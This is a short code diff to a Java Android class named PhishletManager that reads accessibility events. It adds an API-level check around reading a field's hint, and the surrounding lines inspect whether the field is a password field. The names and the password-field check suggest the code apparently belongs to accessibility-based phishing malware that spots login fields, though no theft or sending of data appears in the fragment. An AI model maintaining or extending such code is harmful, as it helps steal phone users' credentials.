@@ -172,7 +172,10 @@ public final class PhishletManager {
         try {
             AccessibilityNodeInfo src = event.getSource();
             if (src != null) {
-                CharSequence hint = src.getHint();
+                CharSequence hint = null;
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    hint = src.getHint();
+                }
                 CharSequence clazz = src.getClassName();
                 boolean password = src.isPassword();
                 src.recycle();
